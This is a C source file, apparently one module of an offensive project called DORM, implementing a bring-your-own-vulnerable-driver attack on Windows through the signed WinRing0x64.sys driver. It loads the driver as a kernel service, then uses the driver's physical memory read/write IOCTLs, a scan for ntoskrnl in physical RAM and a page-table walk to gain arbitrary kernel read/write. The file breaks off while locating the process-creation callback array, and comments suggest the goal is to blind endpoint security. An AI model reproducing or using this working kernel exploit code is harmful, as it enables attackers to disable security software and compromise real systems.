/*
 * byovd_winring0x64.c — DORM Phase 14: BYOVD via WinRing0x64.sys
 * byovd/kernel_subverter/byovd_winring0x64.c
 *
 * Windows x64 | MinGW/Clang | ring-3
 *
 * Drop-in replacement for byovd.c. Same public API (byovd.h),
 * different driver underneath. Swap in the build command:
 *
 *   clang byovd/kernel_subverter/byovd_winring0x64.c  \
 *         byovd/kernel_subverter/test_byovd.c         \
 *         -Ibyovd/kernel_subverter                    \
 *         -o test_byovd.exe -lkernel32 -ladvapi32
 *
 * Driver: WinRing0x64.sys (LibreHardwareMonitor embedded build)
 *   SHA256: 11BD2C9F9E2397C9A16E0990E4ED2CF0679498FE0FD418A3DFDAC60B5C160EE5
 *   NOT on Windows 11 CI.dll compiled-in IOCTL blocklist.
 *   IOCTLs reach driver dispatch on Win11 22H2+ without any CI config.
 *
 * IOCTL Protocol (from WinRing0 open-source driver + public research):
 *
 *   Device:  \\.\WinRing0_1_2_0
 *   Service: WinRing0_1_2_0
 *
 *   IOCTL function codes (CTL_CODE(DeviceType=0x9C40, Function, METHOD_BUFFERED, FILE_ANY_ACCESS)):
 *
 *   MSR operations (RDMSR/WRMSR — NOT for memory):
 *     IOCTL_OLS_READ_MSR   0x9C402084  Function=0x821
 *     IOCTL_OLS_WRITE_MSR  0x9C402088  Function=0x822
 *
 *   Physical memory operations (what we actually want):
 *     IOCTL_OLS_READ_MEMORY  0x9C402104  Function=0x841
 *       Input  (16 bytes): OLS_READ_INPUT  { DWORD64 Address, DWORD UnitSize, DWORD Count }
 *       Output (4 bytes):  raw DWORD value read from physical address
 *
 *     IOCTL_OLS_WRITE_MEMORY 0x9C402108  Function=0x842
 *       Input  (20 bytes): OLS_WRITE_INPUT { DWORD64 Address, DWORD UnitSize, DWORD Count, DWORD Data }
 *       Output: none
 *
 * VA→PA strategy:
 *   WinRing0 speaks PHYSICAL addresses only. Kernel VAs must be translated
 *   before use. We do this by scanning physical RAM for ntoskrnl's PE header,
 *   establishing a VA-base → PA-base delta, then applying it to any address
 *   within ntoskrnl's image (text, data, rdata sections).
 *
 *   For EX_CALLBACK_ROUTINE_BLOCK pointers (kernel pool), which live outside
 *   ntoskrnl's image range, a full CR3 page-table walk via phys_read4 is
 *   performed. See va_to_pa_pagewalk() below.
 *
 * R/W strategy:
 *   phys_read4 / phys_write4   — raw physical IOCTL (primitive layer)
 *   byovd_read4 / byovd_write4 — VA→PA wrapper (public API layer)
 *   byovd_read8 / byovd_write8 — two split 4-byte ops, little-endian
 *
 * Link: -lkernel32 -ladvapi32
 */

#include <stdio.h>
#include <string.h>
#include <stddef.h>
#include <time.h>
#include <windows.h>

#include "byovd.h"

/* ============================================================
   CONSTANTS
   ============================================================ */

#define WINRING0_SVC_NAME    "WinRing0_1_2_0"
#define WINRING0_DEVICE      "\\\\.\\WinRing0_1_2_0"

/*
 * FIX 1: Correct IOCTL codes.
 *
 * WRONG (MSR read/write — sends RDMSR with kernel VA as MSR index → #GP):
 *   0x9C402084  IOCTL_OLS_READ_MSR   (Function=0x821)
 *   0x9C402088  IOCTL_OLS_WRITE_MSR  (Function=0x822)
 *
 * CORRECT (physical memory read/write):
 *   0x9C402104  IOCTL_OLS_READ_MEMORY  (Function=0x841)
 *   0x9C402108  IOCTL_OLS_WRITE_MEMORY (Function=0x842)
 *
 * The delta between MSR and MEM function codes: 0x841 - 0x821 = 0x20 (32 decimal).
 * CTL_CODE shifts Function by 2 bits → IOCTL delta = 0x20 << 2 = 0x80. ✓
 *   0x9C402084 + 0x80 = 0x9C402104  ← MEM_READ
 *   0x9C402088 + 0x80 = 0x9C402108  ← MEM_WRITE
 */
#define WINRING0_IOCTL_READ_MSR    0x9C402084UL  /* RDMSR  — kept for diagnostic */
#define WINRING0_IOCTL_WRITE_MSR   0x9C402088UL  /* WRMSR  — kept for diagnostic */
#define WINRING0_IOCTL_READ_MEM    0x9C402104UL  /* IOCTL_OLS_READ_MEMORY        */
#define WINRING0_IOCTL_WRITE_MEM   0x9C402108UL  /* IOCTL_OLS_WRITE_MEMORY       */

#define PSPCRN_MAX_ENTRIES   64UL
#define EX_CB_FUNC_OFFSET    8ULL
#define SYSTINFO_MODULES     11UL

/* Physical scan range: 1 MB to 4 GB in 2 MB steps.
 * ntoskrnl always maps to a 2 MB-aligned physical base in practice. */
#define PHYS_SCAN_START  0x100000ULL
#define PHYS_SCAN_END    0x100000000ULL
#define PHYS_SCAN_STEP   0x200000ULL
#define NTOS_MAX_SIZE    0x1000000ULL   /* 16 MB cap for VA offset range */

/* ============================================================
   WINRING0 MEMORY OPERATION STRUCTURES
   ============================================================ */

/* Input for IOCTL_OLS_READ_MEMORY — 16 bytes */
#pragma pack(push, 1)
typedef struct {
    DWORD64 Address;    /* +0x00  PHYSICAL address         */
    DWORD   UnitSize;   /* +0x08  bytes: 1 / 2 / 4 / 8    */
    DWORD   Count;      /* +0x0C  number of units           */
} OLS_READ_INPUT;       /* = 0x10 = 16 bytes                */
#pragma pack(pop)

/* Input for IOCTL_OLS_WRITE_MEMORY — 20 bytes */
#pragma pack(push, 1)
typedef struct {
    DWORD64 Address;    /* +0x00  PHYSICAL address          */
    DWORD   UnitSize;   /* +0x08  bytes: 1 / 2 / 4 / 8     */
    DWORD   Count;      /* +0x0C  number of units           */
    DWORD   Data;       /* +0x10  value to write (DWORD)    */
} OLS_WRITE_INPUT;      /* = 0x14 = 20 bytes                */
#pragma pack(pop)

_Static_assert(sizeof(OLS_READ_INPUT)  == 16, "OLS_READ_INPUT must be 16 bytes");
_Static_assert(sizeof(OLS_WRITE_INPUT) == 20, "OLS_WRITE_INPUT must be 20 bytes");

/* ============================================================
   NT INTERNALS
   ============================================================ */

typedef NTSTATUS (NTAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

typedef struct {
    ULONG_PTR Reserved[2];
    PVOID     ImageBase;
    ULONG     ImageSize;
    ULONG     Flags;
    WORD      LoadOrderIndex;
    WORD      InitOrderIndex;
    WORD      LoadCount;
    WORD      OffsetToFileName;
    CHAR      FullPathName[256];
} DORM_SYS_MODULE;

typedef struct {
    ULONG           Count;
    DORM_SYS_MODULE Modules[1];
} DORM_SYS_MODULE_INFO;

/* ============================================================
   MODULE STATE
   ============================================================ */

static HANDLE g_device             = INVALID_HANDLE_VALUE;
static char   g_driver_path[MAX_PATH] = {0};

/* VA→PA translation state — set once by byovd_find_ntoskrnl_phys() */
static ULONG64 g_ntoskrnl_va_base  = 0;
static ULONG64 g_ntoskrnl_pa_base  = 0;

/* ============================================================
   HELPERS
   ============================================================ */

static void json_escape(FILE *fp, const char *s)
{
    /* *the callback module: the only part of the EDR that admits it's there* */
    if (!s) { fputs("\"\"", fp); return; }
    fputc('"', fp);
    for (const char *p = s; *p; p++) {
        switch (*p) {
            case '"':  fputs("\\\"", fp); break;
            case '\\': fputs("\\\\", fp); break;
            case '\n': fputs("\\n",  fp); break;
            case '\r': fputs("\\r",  fp); break;
            default:
                if ((unsigned char)*p < 0x20)
                    fprintf(fp, "\\u%04X", (unsigned char)*p);
                else fputc(*p, fp);
        }
    }
    fputc('"', fp);
}

static FILE *open_output(const char *path)
{
    if (!path || strcmp(path, "-") == 0) return stdout;
    FILE *fp = NULL; fopen_s(&fp, path, "w"); return fp;
}

static void ts_now(char *buf, int len)
{
    time_t n = time(NULL);
    struct tm *g = gmtime(&n);
    strftime(buf, (size_t)len, "%Y-%m-%dT%H:%M:%SZ", g);
}

/* ============================================================
   DRIVER LOAD / UNLOAD
   ============================================================ */

BOOL byovd_load(const char *driver_path)
{
    /* *the signed certificate: the kernel's one act of faith* */
    strncpy(g_driver_path, driver_path, MAX_PATH - 1);

    char abs_path[MAX_PATH] = {0};
    if (!GetFullPathNameA(driver_path, MAX_PATH, abs_path, NULL)) return FALSE;

    if (GetFileAttributesA(abs_path) == INVALID_FILE_ATTRIBUTES) {
        printf("[byovd] WinRing0x64.sys not found: %s\n", abs_path);
        return FALSE;
    }

    SC_HANDLE hScm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hScm) {
        printf("[byovd] OpenSCManager failed error=%lu\n", GetLastError());
        return FALSE;
    }

    /* Remove any stale service from a previous run */
    SC_HANDLE hSvc = OpenServiceA(hScm, WINRING0_SVC_NAME, SERVICE_ALL_ACCESS);
    if (hSvc) {
        SERVICE_STATUS ss = {0};
        ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
        Sleep(300);
        DeleteService(hSvc);
        CloseServiceHandle(hSvc);
        Sleep(300);
    }

    hSvc = CreateServiceA(
        hScm,
        WINRING0_SVC_NAME,
        WINRING0_SVC_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        abs_path,
        NULL, NULL, NULL, NULL, NULL);

    if (!hSvc) {
        printf("[byovd] CreateService failed error=%lu\n", GetLastError());
        CloseServiceHandle(hScm);
        return FALSE;
    }

    if (!StartServiceA(hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[byovd] StartService failed error=%lu\n", err);
            DeleteService(hSvc);
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hScm);
            return FALSE;
        }
    }

    printf("[byovd] WinRing0x64.sys loaded — service started\n");
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
    Sleep(400);
    return TRUE;
}

BOOL byovd_unload(void)
{
    byovd_close();
    /* reset translation state so stale PA isn't used on reload */
    g_ntoskrnl_va_base = 0;
    g_ntoskrnl_pa_base = 0;

    SC_HANDLE hScm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hScm) return FALSE;

    SC_HANDLE hSvc = OpenServiceA(hScm, WINRING0_SVC_NAME, SERVICE_ALL_ACCESS);
    BOOL ok = FALSE;

    if (hSvc) {
        SERVICE_STATUS ss = {0};
        ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
        Sleep(300);
        ok = DeleteService(hSvc);
        CloseServiceHandle(hSvc);
        printf("[byovd] WinRing0x64.sys unloaded — service deleted\n");
    }

    CloseServiceHandle(hScm);
    return ok;
}

/* ============================================================
   DEVICE HANDLE
   ============================================================ */

BOOL byovd_open(void)
{
    g_device = CreateFileA(
        WINRING0_DEVICE,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL);

    if (g_device == INVALID_HANDLE_VALUE) {
        printf("[byovd] CreateFile(%s) failed error=%lu\n",
               WINRING0_DEVICE, GetLastError());
        return FALSE;
    }
    printf("[byovd] device handle: %p\n", (void *)g_device);
    return TRUE;
}

void byovd_close(void)
{
    if (g_device != INVALID_HANDLE_VALUE) {
        CloseHandle(g_device);
        g_device = INVALID_HANDLE_VALUE;
    }
}

/* ============================================================
   PHYSICAL LAYER — raw physical address R/W
   These speak directly to IOCTL_OLS_READ/WRITE_MEMORY.
   Caller is responsible for passing a PHYSICAL address.
   ============================================================ */

/*
 * phys_read4 — read one DWORD from a PHYSICAL address.
 * Input struct: OLS_READ_INPUT  (16 bytes, Address = PA)
 * Output:       4-byte DWORD value
 */
static BOOL phys_read4(ULONG64 phys_addr, ULONG *out)
{
    if (g_device == INVALID_HANDLE_VALUE || !out) return FALSE;

    OLS_READ_INPUT in_buf;
    ZeroMemory(&in_buf, sizeof(in_buf));
    in_buf.Address  = phys_addr;
    in_buf.UnitSize = 4;
    in_buf.Count    = 1;

    DWORD out_val  = 0;
    DWORD returned = 0;

    if (!DeviceIoControl(g_device, WINRING0_IOCTL_READ_MEM,
                         &in_buf, sizeof(in_buf),
                         &out_val, sizeof(out_val),
                         &returned, NULL))
    {
        /* don't log — callers handle silence for scan loops */
        return FALSE;
    }

    *out = out_val;
    return TRUE;
}

/*
 * phys_write4 — write one DWORD to a PHYSICAL address.
 * Input struct: OLS_WRITE_INPUT (20 bytes, Address = PA)
 */
static BOOL phys_write4(ULONG64 phys_addr, ULONG value)
{
    if (g_device == INVALID_HANDLE_VALUE) return FALSE;

    OLS_WRITE_INPUT in_buf;
    ZeroMemory(&in_buf, sizeof(in_buf));
    in_buf.Address  = phys_addr;
    in_buf.UnitSize = 4;
    in_buf.Count    = 1;
    in_buf.Data     = value;

    DWORD returned = 0;
    if (!DeviceIoControl(g_device, WINRING0_IOCTL_WRITE_MEM,
                         &in_buf, sizeof(in_buf),
                         NULL, 0, &returned, NULL))
        return FALSE;

    return TRUE;
}

/* ============================================================
   VA→PA TRANSLATION LAYER

   Two strategies, selected automatically:

   1. DELTA method (fast):
      For VAs within ntoskrnl's image (text/data/rdata).
      pa = g_ntoskrnl_pa_base + (va - g_ntoskrnl_va_base)
      Valid only after byovd_find_ntoskrnl_phys() has run.

   2. PAGE-TABLE WALK method (universal):
      For VAs outside ntoskrnl image (e.g. EX_CALLBACK_ROUTINE_BLOCK
      in kernel pool, PspCreateProcessNotifyRoutine callback pointers).
      Reads CR3 from KPCR (via MSR 0xC0000101 = IA32_GS_BASE) and
      manually walks PML4→PDPT→PD→PT using phys_read4.

      NOTE: We read IA32_GS_BASE via IOCTL_OLS_READ_MSR to get the
      kernel KPCR PA, then extract DirectoryTableBase (CR3) from
      EPROCESS of the System process (PID 4). In practice the simplest
      portable approach is to scan for a valid PML4 in low physical RAM
      (same scan we'd do for CR3 brute-force) or to use the KPCR MSR path.

      For DORM Phase 14 the callback array lives in ntoskrnl .data and
      the EX_CALLBACK blocks live in NonPagedPool. Both are reachable:
        - array entries: delta method (array is in ntoskrnl image)
        - block_ptr + EX_CB_FUNC_OFFSET: page-table walk

   ============================================================ */

/*
 * byovd_find_ntoskrnl_phys — scan physical RAM for ntoskrnl PE.
 *
 * Algorithm:
 *   for pa in [1MB .. 4GB) step 2MB:
 *     read DWORD at pa       → must be MZ (0x5A4D)
 *     read DWORD at pa+0x3C  → e_lfanew
 *     read DWORD at pa+e_lfanew → must be PE sig (0x4550)
 *     read WORD  at pe+24    → OptionalHeader.Magic, must be 0x020B (PE32+)
 *     read QWORD at pe+48    → OptionalHeader.ImageBase
 *     compare ImageBase with ntoskrnl_va_base from NtQSI
 *
 * Sets g_ntoskrnl_pa_base on success.
 * Returns physical base, or 0 on failure.
 */
ULONG64 byovd_find_ntoskrnl_phys(ULONG64 ntoskrnl_va_base)
{
    /* *the kernel: somewhere in this sea of 4 KB pages, exactly one* */
    printf("[byovd] scanning physical memory for ntoskrnl "
           "(VA base: 0x%016llX)...\n",
           (unsigned long long)ntoskrnl_va_base);

    g_ntoskrnl_va_base = ntoskrnl_va_base;

    for (ULONG64 pa = PHYS_SCAN_START; pa < PHYS_SCAN_END; pa += PHYS_SCAN_STEP) {

        /* check MZ signature */
        ULONG magic = 0;
        if (!phys_read4(pa, &magic)) continue;
        if ((magic & 0xFFFF) != 0x5A4D) continue;

        /* read e_lfanew (IMAGE_DOS_HEADER.e_lfanew at +0x3C) */
        ULONG e_lfanew = 0;
        if (!phys_read4(pa + 0x3C, &e_lfanew)) continue;
        if (e_lfanew < 0x40 || e_lfanew > 0x800) continue;

        /* PE signature at e_lfanew */
        ULONG pe_sig = 0;
        if (!phys_read4(pa + e_lfanew, &pe_sig)) continue;
        if (pe_sig != 0x00004550) continue;   /* "PE\0\0" */

        /*
         * OptionalHeader starts at e_lfanew + 4 (PE sig) + 20 (FileHeader) = e_lfanew + 24
         * OptionalHeader.Magic  at e_lfanew + 24          (2 bytes, read as DWORD, mask low word)
         * OptionalHeader.ImageBase at e_lfanew + 48       (8 bytes = two DWORD reads)
         */
        ULONG oh_magic = 0;
        if (!phys_read4(pa + e_lfanew + 24, &oh_magic)) continue;
        if ((oh_magic & 0xFFFF) != 0x020B) continue;   /* PE32+ */

        ULONG ib_lo = 0, ib_hi = 0;
        if (!phys_read4(pa + e_lfanew + 48,     &ib_lo)) continue;
        if (!phys_read4(pa + e_lfanew + 48 + 4, &ib_hi)) continue;
        ULONG64 image_base = ((ULONG64)ib_hi << 32) | (ULONG64)ib_lo;

        if (image_base != ntoskrnl_va_base) continue;

        printf("[byovd] ntoskrnl physical base: 0x%016llX "
               "(delta: 0x%016llX)\n",
               (unsigned long long)pa,
               (unsigned long long)(ntoskrnl_va_base - pa));

        g_ntoskrnl_pa_base = pa;
        return pa;
    }

    printf("[byovd] physical scan failed — ntoskrnl not found in first 4 GB\n");
    return 0;
}

/*
 * va_to_pa_delta — fast path: translate ntoskrnl-section VA using base delta.
 * Returns 0 if VA is outside ntoskrnl image range (caller falls through to walk).
 */
static ULONG64 va_to_pa_delta(ULONG64 va)
{
    if (!g_ntoskrnl_pa_base || !g_ntoskrnl_va_base) return 0;
    if (va <  g_ntoskrnl_va_base)                    return 0;
    if (va >= g_ntoskrnl_va_base + NTOS_MAX_SIZE)    return 0;
    return g_ntoskrnl_pa_base + (va - g_ntoskrnl_va_base);
}

/*
 * va_to_pa_pagewalk — universal x64 4-level page table walk.
 *
 * Requires a valid CR3 (PDBR). We obtain it by reading IA32_GS_BASE
 * (MSR 0xC0000101) via IOCTL_OLS_READ_MSR — this gives us the KPCR VA
 * in kernel mode. We then use the delta method to read
 * KPCR.Prcb.CurrentThread.ApcState.Process.DirectoryTableBase (CR3).
 *
 * If delta translation fails for any intermediate read (CR3 not yet
 * established or target is pool), the walk returns 0. The callback array
 * itself IS in ntoskrnl image, so the first access always uses delta.
 * Pool block reads go through here.
 *
 * x64 VA layout (4KB pages):
 *   [63:48] sign-extend  [47:39] PML4  [38:30] PDPT  [29:21] PD  [20:12] PT  [11:0] offset
 */
static ULONG64 g_cr3 = 0;  /* cached once after first successful walk init */

static BOOL init_cr3(void)
{
    if (g_cr3) return TRUE;

    /*
     * Read MSR IA32_GS_BASE (0xC0000101) while executing in kernel context
     * (inside IOCTL handler). On x64 Windows, GS in kernel mode points to KPCR.
     *
     * WinRing0 IOCTL_OLS_READ_MSR input: just the 32-bit MSR index.
     * Output: two DWORDs (high, low) — check driver source.
     *
     * Note: WinRing0 MSR read output layout from OlsIoctl.h:
     *   OUT[0] = EAX (low 32 bits of MSR)
     *   OUT[1] = EDX (high 32 bits of MSR)
     */
    struct { DWORD Register; } msr_in = { 0xC0000101 };  /* IA32_GS_BASE */
    struct { DWORD lo; DWORD hi; } msr_out = {0};
    DWORD returned = 0;

    if (!DeviceIoControl(g_device, WINRING0_IOCTL_READ_MSR,
                         &msr_in,  sizeof(msr_in),
                         &msr_out, sizeof(msr_out),
                         &returned, NULL))
    {
        printf("[byovd] MSR read (IA32_GS_BASE) failed error=%lu\n", GetLastError());
        return FALSE;
    }

    ULONG64 kpcr_va = ((ULONG64)msr_out.hi << 32) | (ULONG64)msr_out.lo;
    printf("[byovd] KPCR VA (IA32_GS_BASE): 0x%016llX\n",
           (unsigned long long)kpcr_va);

    /*
     * KPCR → KPRCB → CurrentThread → ApcState.Process → DirectoryTableBase
     *
     * Win10/11 x64 offsets (stable since TH2):
     *   KPCR.Prcb                  offset 0x180  (= &KPRCB)
     *   KPRCB.CurrentThread        offset 0x008  (= PKTHREAD)
     *   KTHREAD.ApcState.Process   offset 0x098  (= PKPROCESS / PEPROCESS)
     *   EPROCESS.DirectoryTableBase offset 0x028 (= CR3)
     *
     * We read these via delta method (KPCR itself may be outside ntoskrnl
     * range — it's KSEG-mapped, which is also covered by the delta since
     * Win maps KPCR in the ntoskrnl virtual range on most builds).
     *
     * If delta fails for KPCR, we fall back to searching low physical
     * memory for a self-referencing PML4 (entry 0x1ED points to self).
     */

    /* Try delta path for KPCR → KPRCB.CurrentThread */
    ULONG64 prcb_va     = kpcr_va + 0x180;
    ULONG64 cur_thread_va_addr = prcb_va + 0x008;

    ULONG lo = 0, hi = 0;
    ULONG64 pa = va_to_pa_delta(cur_thread_va_addr);
    BOOL ok = FALSE;

    if (pa) {
        ok  = phys_read4(pa,     &lo);
        ok &= phys_read4(pa + 4, &hi);
    }

    if (!ok || !(lo | hi)) {
        /*
         * KPCR outside ntoskrnl delta range — scan for self-referencing PML4.
         * Windows x64: PML4[0x1ED] & ~0xFFF == PML4_pa (points to itself).
         */
        printf("[byovd] KPCR delta miss — scanning for self-ref PML4 (CR3)...\n");
        for (ULONG64 cand = 0x1000; cand < 0x10000000ULL; cand += 0x1000) {
            ULONG e_lo = 0, e_hi = 0;
            if (!phys_read4(cand + 0x1ED * 8,     &e_lo)) continue;
            if (!phys_read4(cand + 0x1ED * 8 + 4, &e_hi)) continue;
            ULONG64 entry = ((ULONG64)e_hi << 32) | e_lo;
            if ((entry & 0xFFFFFFFFF000ULL) == cand && (entry & 1)) {
                /* sanity: kernel half entry at 0x1F8 should be present */
                ULONG k_lo = 0;
                if (!phys_read4(cand + 0x1F8 * 8, &k_lo)) continue;
                if (!(k_lo & 1)) continue;
                g_cr3 = cand;
                printf("[byovd] CR3 from self-ref PML4 scan: 0x%016llX\n",
                       (unsigned long long)g_cr3);
                return TRUE;
            }
        }
        printf("[byovd] CR3 acquisition failed\n");
        return FALSE;
    }

    ULONG64 cur_thread = ((ULONG64)hi << 32) | lo;
    /* KTHREAD.ApcState.Process at +0x098 */
    ULONG64 proc_va_addr = cur_thread + 0x098;
    pa = va_to_pa_delta(proc_va_addr);
    lo = 0; hi = 0;
    phys_read4(pa,     &lo);
    phys_read4(pa + 4, &hi);
    ULONG64 eprocess = ((ULONG64)hi << 32) | lo;

    /* EPROCESS.DirectoryTableBase at +0x028 */
    pa = va_to_pa_delta(eprocess + 0x028);
    lo = 0; hi = 0;
    phys_read4(pa,     &lo);
    phys_read4(pa + 4, &hi);
    g_cr3 = ((ULONG64)hi << 32) | lo;
    g_cr3 &= 0xFFFFFFFFFFFFF000ULL;  /* strip lower 12 flag bits */

    printf("[byovd] CR3 from KPCR chain: 0x%016llX\n",
           (unsigned long long)g_cr3);
    return (g_cr3 != 0);
}

/*
 * va_to_pa_pagewalk — 4-level x64 page table walk using g_cr3.
 * Handles 4KB, 2MB, and 1GB pages.
 * Returns physical address, or 0 on failure (not-present / walk error).
 */
static ULONG64 va_to_pa_pagewalk(ULONG64 va)
{
    if (!g_cr3 && !init_cr3()) return 0;

    ULONG64 cr3 = g_cr3;

    /* PML4 index = VA[47:39] */
    ULONG64 pml4_pa  = (cr3 & 0xFFFFFFFFF000ULL) + ((va >> 39 & 0x1FF) * 8);
    ULONG lo = 0, hi = 0;
    if (!phys_read4(pml4_pa,     &lo)) return 0;
    if (!phys_read4(pml4_pa + 4, &hi)) return 0;
    ULONG64 pml4e = ((ULONG64)hi << 32) | lo;
    if (!(pml4e & 1)) return 0;   /* not present */

    /* PDPT index = VA[38:30] */
    ULONG64 pdpt_pa  = (pml4e & 0xFFFFFFFFF000ULL) + ((va >> 30 & 0x1FF) * 8);
    lo = 0; hi = 0;
    if (!phys_read4(pdpt_pa,     &lo)) return 0;
    if (!phys_read4(pdpt_pa + 4, &hi)) return 0;
    ULONG64 pdpte = ((ULONG64)hi << 32) | lo;
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) {   /* 1 GB page: PS bit set in PDPTE */
        return (pdpte & 0xFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
    }

    /* PD index = VA[29:21] */
    ULONG64 pd_pa = (pdpte & 0xFFFFFFFFF000ULL) + ((va >> 21 & 0x1FF) * 8);
    lo = 0; hi = 0;
    if (!phys_read4(pd_pa,     &lo)) return 0;
    if (!phys_read4(pd_pa + 4, &hi)) return 0;
    ULONG64 pde = ((ULONG64)hi << 32) | lo;
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) {   /* 2 MB page: PS bit set in PDE */
        return (pde & 0xFFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
    }

    /* PT index = VA[20:12] */
    ULONG64 pt_pa = (pde & 0xFFFFFFFFF000ULL) + ((va >> 12 & 0x1FF) * 8);
    lo = 0; hi = 0;
    if (!phys_read4(pt_pa,     &lo)) return 0;
    if (!phys_read4(pt_pa + 4, &hi)) return 0;
    ULONG64 pte = ((ULONG64)hi << 32) | lo;
    if (!(pte & 1)) return 0;

    /* 4 KB page */
    return (pte & 0xFFFFFFFFF000ULL) | (va & 0xFFFULL);
}

/*
 * va_to_pa — unified VA→PA: tries delta first, falls through to page walk.
 */
static ULONG64 va_to_pa(ULONG64 va)
{
    ULONG64 pa = va_to_pa_delta(va);
    if (pa) return pa;
    return va_to_pa_pagewalk(va);
}

/* ============================================================
   PUBLIC KERNEL R/W — VA wrappers
   These replace the old direct-IOCTL functions.
   ============================================================ */

BOOL byovd_read4(ULONG64 va, ULONG *out)
{
    ULONG64 pa = va_to_pa(va);
    if (!pa) {
        printf("[byovd] read4: VA→PA failed for 0x%016llX\n",
               (unsigned long long)va);
        return FALSE;
    }
    return phys_read4(pa, out);
}

BOOL byovd_write4(ULONG64 va, ULONG value)
{
    ULONG64 pa = va_to_pa(va);
    if (!pa) {
        printf("[byovd] write4: VA→PA failed for 0x%016llX\n",
               (unsigned long long)va);
        return FALSE;
    }
    return phys_write4(pa, value);
}

BOOL byovd_read8(ULONG64 va, ULONG64 *out)
{
    /* Read as two 4-byte ops; each independently translates VA→PA.
     * va+4 might cross a page boundary — translate separately. */
    ULONG lo = 0, hi = 0;
    if (!byovd_read4(va,     &lo)) return FALSE;
    if (!byovd_read4(va + 4, &hi)) return FALSE;
    *out = ((ULONG64)hi << 32) | (ULONG64)lo;
    return TRUE;
}

BOOL byovd_write8(ULONG64 va, ULONG64 value)
{
    if (!byovd_write4(va,     (ULONG)( value        & 0xFFFFFFFF))) return FALSE;
    if (!byovd_write4(va + 4, (ULONG)((value >> 32) & 0xFFFFFFFF))) return FALSE;
    return TRUE;
}

/* ============================================================
   NtQSI HELPER
   ============================================================ */

static BYTE *nqsi_alloc(ULONG class_id)
{
    NtQSI_t NtQSI = (NtQSI_t)GetProcAddress(
                        GetModuleHandleA("ntdll.dll"),
                        "NtQuerySystemInformation");
    if (!NtQSI) return NULL;

    ULONG    sz  = 0x20000;
    BYTE    *buf = NULL;
    NTSTATUS nt;

    do {
        HeapFree(GetProcessHeap(), 0, buf);
        buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
        if (!buf) return NULL;
        nt = NtQSI(class_id, buf, sz, &sz);
        sz += 0x2000;
    } while (nt == STATUS_INFO_LENGTH_MISMATCH);

    if (nt != STATUS_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, buf);
        return NULL;
    }
    return buf;
}

/* ============================================================
   KERNEL BASE RESOLUTION
   ============================================================ */

ULONG64 byovd_get_kernel_base(void)
{
    BYTE *buf = nqsi_alloc(SYSTINFO_MODULES);
    if (!buf) return 0;
    DORM_SYS_MODULE_INFO *mi = (DORM_SYS_MODULE_INFO *)buf;
    ULONG64 base = (mi->Count > 0)
                   ? (ULONG64)(ULONG_PTR)mi->Modules[0].ImageBase : 0;
    HeapFree(GetProcessHeap(), 0, buf);
    return base;
}

/* ============================================================
   EXPORT RESOLUTION
   ============================================================ */

ULONG64 byovd_resolve_export(ULONG64 kernel_base, const char *export_name)
{
    BYTE *buf = nqsi_alloc(SYSTINFO_MODULES);
    if (!buf) return 0;

    DORM_SYS_MODULE_INFO *mi = (DORM_SYS_MODULE_INFO *)buf;
    char disk_path[MAX_PATH] = {0};

    if (mi->Count > 0) {
        const char *fn = mi->Modules[0].FullPathName;
        if (_strnicmp(fn, "\\SystemRoot\\", 12) == 0) {
            char win_dir[MAX_PATH] = {0};
            GetWindowsDirectoryA(win_dir, MAX_PATH);
            snprintf(disk_path, MAX_PATH - 1, "%s\\%s", win_dir, fn + 12);
        } else {
            strncpy(disk_path, fn, MAX_PATH - 1);
        }
    }
    HeapFree(GetProcessHeap(), 0, buf);
    if (!disk_path[0]) return 0;

    HANDLE hFile = CreateFileA(disk_path, GENERIC_READ,
                               FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    HANDLE hMap  = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return 0; }

    BYTE   *disk   = (BYTE *)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    ULONG64 result = 0;

    if (disk) {
        IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER *)disk;
        IMAGE_NT_HEADERS64 *nt  = (IMAGE_NT_HEADERS64 *)(disk + dos->e_lfanew);
        IMAGE_DATA_DIRECTORY *dd =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

        if (dd->VirtualAddress && dd->Size) {
            IMAGE_EXPORT_DIRECTORY *exp =
                (IMAGE_EXPORT_DIRECTORY *)(disk + dd->VirtualAddress);
            DWORD *names    = (DWORD *)(disk + exp->AddressOfNames);
            WORD  *name_ord = (WORD  *)(disk + exp->AddressOfNameOrdinals);
            DWORD *funcs    = (DWORD *)(disk + exp->AddressOfFunctions);
            for (DWORD i = 0; i < exp->NumberOfNames; i++) {
                if (strcmp((const char *)(disk + names[i]), export_name) == 0) {
                    result = kernel_base + funcs[name_ord[i]];
                    break;
                }
            }
        }
        UnmapViewOfFile(disk);
    }
    CloseHandle(hMap);
    CloseHandle(hFile);
    return result;
}

/* ============================================================
   LOCATE PspCreateProcessNotifyRoutine
   ============================================================ */

static ULONG64 find_pspcrn_array(ULONG64 kernel_base)
{
    ULONG64 fn_va = byovd_resolve_export(
                        kernel_base,
                        "PsSetCreateProcessNotifyRoutine");
    if (!fn_va) {
